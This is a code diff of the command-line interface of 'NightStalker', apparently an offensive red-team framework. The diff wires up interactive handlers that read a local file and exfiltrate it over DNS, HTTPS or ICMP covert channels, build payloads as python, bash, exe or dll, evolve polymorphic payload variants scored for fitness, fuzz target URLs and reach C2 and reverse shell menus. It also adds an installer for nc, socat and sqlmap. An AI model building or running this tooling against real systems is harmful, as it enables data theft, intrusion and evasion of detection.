@@ -48,6 +48,17 @@ def get_nightstalker_home():
     return ns_home
 
 NIGHTSTALKER_HOME = get_nightstalker_home()
+
+def get_nightstalker_dir():
+    """Get NightStalker installation directory"""
+    # Check environment variable first
+    if 'NIGHTSTALKER_DIR' in os.environ:
+        return os.environ['NIGHTSTALKER_DIR']
+    
+    # Fallback to current directory
+    return os.getcwd()
+
+NIGHTSTALKER_DIR = get_nightstalker_dir()
 # --------------------------------------------------
 
 class NightStalkerCLI:
@@ -362,7 +373,7 @@ Command Groups:
   payload       Build, list, or clean payloads
   stealth       Stealth reverse shell payload operations
   pentest       Run penetration testing campaigns
-  redteam       Offensive operations (attack, fuzz)
+  redteam       Offensive operations (attack, fuzz, exploit)
   exfil         Data exfiltration
   monitor       File system monitoring
   env           Environment management
@@ -620,75 +631,72 @@ For detailed help on each group or subcommand, use:
                 return 0
                 
             elif args.red_cmd == 'fuzz':
-                print("[RedTeam] Starting fuzzing operations...")
+                print("[RedTeam] Starting genetic fuzzing...")
                 from .redteam.fuzzer import GeneticFuzzer
-                
-                fuzzer = GeneticFuzzer()
-                target = getattr(args, 'target', None) or input("Enter target: ").strip()
-                fuzz_type = getattr(args, 'type', None) or input("Enter fuzz type (http/file/command): ").strip()
-                
-                result = fuzzer.start_fuzzing(target, fuzz_type, 100)
-                
-                if result.get('success'):
-                    print(f"✅ Fuzzing started successfully!")
-                    print(f"🎯 Target: {result.get('target')}")
-                    print(f"📊 Session ID: {result.get('session_id')}")
+                target = getattr(args, 'target', None) or input("Target URL: ").strip()
+                generations = getattr(args, 'generations', 100)
+                population_size = getattr(args, 'population_size', 50)
+                mutation_rate = getattr(args, 'mutation_rate', 0.3)
+                wordlist = getattr(args, 'wordlist', None)
+                output = getattr(args, 'output', None)
+                wordlist_path = wordlist if wordlist is not None else "wordlists/common.txt"
+                fuzzer = GeneticFuzzer(target_url=target, wordlist_path=wordlist_path)
+                fuzzer.population_size = population_size
+                fuzzer.mutation_rate = mutation_rate
+                result = fuzzer.run_fuzzing(generations=generations)
+                if isinstance(result, dict):
+                    print(f"✅ Fuzzing completed!")
+                    print(f"📊 Generations: {len(result['generations'])}")
+                    if output:
+                        fuzzer.save_results(result, output)
+                        print(f"Results saved to {output}")
                 else:
-                    print(f"❌ Fuzzing failed: {result.get('error')}")
+                    print(f"❌ Fuzzing failed: {result}")
                     return 1
-                    
+
             elif args.red_cmd == 'payload':
                 print("[RedTeam] Building payload...")
                 from .redteam.payload_builder import PayloadBuilder
-                
                 builder = PayloadBuilder()
                 payload_type = getattr(args, 'type', None) or input("Payload type: ").strip()
-                target_os = getattr(args, 'os', None) or input("Target OS: ").strip()
-                
-                config = {
-                    'type': payload_type,
-                    'target_os': target_os,
-                    'architecture': 'x64',
-                    'encryption': True,
-                    'obfuscation': True
-                }
-                
-                result = builder.build_payload(config)
-                
-                if result.get('success'):
+                output_format = getattr(args, 'format', None) or input("Output format (python/bash/exe/dll): ").strip()
+                try:
+                    output_path = builder.build_payload(payload_type, output_format)
                     print(f"✅ Payload built successfully!")
-                    print(f"📁 Location: {result.get('filepath')}")
-                else:
-                    print(f"❌ Payload build failed: {result.get('error')}")
+                    print(f"📁 Location: {output_path}")
+                except Exception as e:
+                    print(f"❌ Payload build failed: {e}")
                     return 1
-                    
+
             elif args.red_cmd == 'exfil':
                 print("[RedTeam] Starting data exfiltration...")
                 from .redteam.exfiltration import CovertChannels
-                
                 channels = CovertChannels()
                 data_file = getattr(args, 'data', None) or input("Data file path: ").strip()
                 channel_type = getattr(args, 'channel', None) or input("Channel type (dns/https/icmp): ").strip()
-                
+                try:
+                    with open(data_file, 'rb') as f:
+                        data_bytes = f.read()
+                except Exception as e:
+                    print(f"❌ Failed to read data file: {e}")
+                    return 1
                 if channel_type == 'dns':
                     domain = input("Domain name: ").strip()
-                    result = channels.dns_exfiltration(data_file, domain)
+                    dns_server = input("DNS server (default: 8.8.8.8): ").strip() or "8.8.8.8"
+                    result = channels.dns_exfiltration(data_bytes, dns_server, domain)
                 elif channel_type == 'https':
                     server_url = input("Server URL: ").strip()
-                    api_key = input("API Key: ").strip()
-                    result = channels.https_exfiltration(data_file, server_url, api_key)
+                    result = channels.https_exfiltration(data_bytes, server_url)
                 elif channel_type == 'icmp':
                     target_ip = input("Target IP: ").strip()
-                    result = channels.icmp_exfiltration(data_file, target_ip)
+                    result = channels.icmp_exfiltration(data_bytes, target_ip)
                 else:
                     print(f"❌ Unknown channel type: {channel_type}")
                     return 1
-                
-                if result.get('success'):
+                if result:
                     print(f"✅ Exfiltration completed!")
-                    print(f"📊 Data sent: {result.get('bytes_sent', 0)} bytes")
                 else:
-                    print(f"❌ Exfiltration failed: {result.get('error')}")
+                    print(f"❌ Exfiltration failed.")
                     return 1
                     
             elif args.red_cmd == 'monitor':
@@ -713,17 +721,24 @@ For detailed help on each group or subcommand, use:
                 from .redteam.polymorph import PolymorphicEngine
                 
                 engine = PolymorphicEngine()
-                payload_type = getattr(args, 'type', None) or input("Payload type: ").strip()
-                mutation_level = getattr(args, 'level', None) or input("Mutation level (1-10): ").strip()
+                payload_file = getattr(args, 'payload', None) or input("Base payload file path: ").strip()
+                mutation_level = getattr(args, 'level', None) or input("Mutation level (generations, e.g. 10): ").strip()
                 
-                result = engine.generate_polymorphic_payload(payload_type, int(mutation_level))
-                
-                if result.get('success'):
+                try:
+                    with open(payload_file, 'rb') as f:
+                        base_payload = f.read()
+                    generations = int(mutation_level)
+                    best_variant = engine.run_evolution(base_payload, generations)
+                    output_path = f"output/polymorph_{int(time.time())}.bin"
+                    os.makedirs(os.path.dirname(output_path), exist_ok=True)
+                    with open(output_path, 'wb') as f:
+                        f.write(best_variant.data)
                     print(f"✅ Polymorphic payload generated!")
-                    print(f"📁 Location: {result.get('filepath')}")
-                    print(f"🔄 Mutations: {result.get('mutations', 0)}")
-                else:
-                    print(f"❌ Polymorphic generation failed: {result.get('error')}")
+                    print(f"📁 Location: {output_path}")
+                    print(f"🔄 Mutations: {best_variant.mutation_history}")
+                    print(f"🏆 Fitness: {best_variant.fitness_score}")
+                except Exception as e:
+                    print(f"❌ Polymorphic generation failed: {e}")
                     return 1
                     
             elif args.red_cmd == 'exploit':
@@ -1567,12 +1582,12 @@ For detailed help on each group or subcommand, use:
                 
                 try:
                     engine = PolymorphicEngine()
-                    result = engine.generate_polymorphic_payload(payload_type, int(mutation_level))
+                    result = engine.generate_payload(payload_type, int(mutation_level))
                     
                     if result.get('success'):
                         print(f"✅ Polymorphic payload generated!")
-                        print(f"📁 Location: {result.get('filepath')}")
-                        print(f"🔄 Mutations applied: {result.get('mutations', 0)}")
+                        print(f"📁 Location: {result.get('filepath', 'N/A')}")
+                        print(f"🔄 Mutations: {result.get('mutations', 0)}")
                     else:
                         print(f"❌ Generation failed: {result.get('error')}")
                         
@@ -2576,6 +2591,11 @@ def main():
     """Main entry point for NightStalker CLI"""
     cli = NightStalkerCLI()
     
+    # Check for help argument first
+    if len(sys.argv) > 1 and sys.argv[1] in ['--help', '-h']:
+        cli.parser.print_help()
+        return 0
+    
     # If no arguments provided, show interactive menu
     if len(sys.argv) == 1:
         while True:
@@ -2588,8 +2608,10 @@ def main():
             print("5. Web Red Teaming")
             print("6. C2 Operations")
             print("7. Exit")
+            print("8. Install Tools")
+            print("9. Uninstall NightStalker")
             try:
-                choice = input("\nSelect an option (1-7): ").strip()
+                choice = input("\nSelect an option (1-9): ").strip()
                 if choice == '1':
                     cli._handle_payload_menu()
                 elif choice == '2':
@@ -2605,15 +2627,54 @@ def main():
                 elif choice == '7':
                     print("Exiting NightStalker. Goodbye!")
                     return 0
+                elif choice == '8':
+                    try:
+                        from nightstalker.utils.tool_manager import ToolManager
+                        required_tools = [
+                            'nmap', 'nuclei', 'sqlmap', 'ffuf', 'amass', 'curl', 'wget', 'nc', 'socat'
+                        ]
+                        print("\n[*] Installing required tools...")
+                        ToolManager.check_and_install_tools(required_tools, logger)
+                        print("[+] Tool installation complete. Press Enter to return to the main menu...")
+                        input()
+                    except Exception as e:
+                        print(f"[Error] {e}")
+                        input("Press Enter to return to the main menu...")
+                elif choice == '9':
+                    print("\n[!] This will uninstall NightStalker from your system.")
+                    confirm = input("Are you sure? (y/N): ").strip().lower()
+                    if confirm == 'y':
+                        import subprocess
+                        import sys
+                        import os
+                        try:
+                            # Safely run uninstaller with proper path validation
+                            uninstall_script = 'uninstall_nightstalker.sh'
+                            if os.path.exists(uninstall_script) and os.path.isfile(uninstall_script):
+                                # Use absolute path and validate script
+                                script_path = os.path.abspath(uninstall_script)
+                                if script_path.endswith('.sh') and 'nightstalker' in script_path.lower():
+                                    subprocess.run(['bash', script_path], timeout=60)
+                                else:
+                                    print("[Error] Invalid uninstall script")
+                            else:
+                                print("[Error] Uninstall script not found")
+                        except Exception as e:
+                            print(f"[Error] Failed to run uninstaller: {e}")
+                        print("Exiting NightStalker. Goodbye!")
+                        sys.exit(0)
+                    else:
+                        print("Uninstall cancelled. Returning to main menu.")
+                        input("Press Enter to continue...")
                 else:
-                    print("Invalid option. Please select 1-7.")
+                    print("Invalid option. Please select 1-9.")
             except KeyboardInterrupt:
                 print("\n\nExiting NightStalker. Goodbye!")
                 return 0
             except Exception as e:
                 logger.error(f"\n[!] Error: {e}", exc_info=True)
                 continue
-        
+    
     try:
         parsed_args = cli.parser.parse_args()
         # Handle verbose logging
@@ -2733,14 +2794,23 @@ NightStalker Main Menu
         elif choice == '3':
             stealth_payload_builder_menu()
         elif choice == '4':
-            print("[Red Team Operations] (Feature coming in next step)")
-            input("Press Enter to return to the main menu...")
+            try:
+                cli._handle_redteam_menu()
+            except Exception as e:
+                print(f"[Error] {e}")
+                input("Press Enter to return to the main menu...")
         elif choice == '5':
-            print("[Web Red Teaming] (Feature coming in next step)")
-            input("Press Enter to return to the main menu...")
+            try:
+                cli._handle_webred_menu()
+            except Exception as e:
+                print(f"[Error] {e}")
+                input("Press Enter to return to the main menu...")
         elif choice == '6':
-            print("[C2 Operations] (Feature coming in next step)")
-            input("Press Enter to return to the main menu...")
+            try:
+                cli._handle_c2_menu()
+            except Exception as e:
+                print(f"[Error] {e}")
+                input("Press Enter to return to the main menu...")
         elif choice == '7':
             print("Exiting NightStalker.")
             break
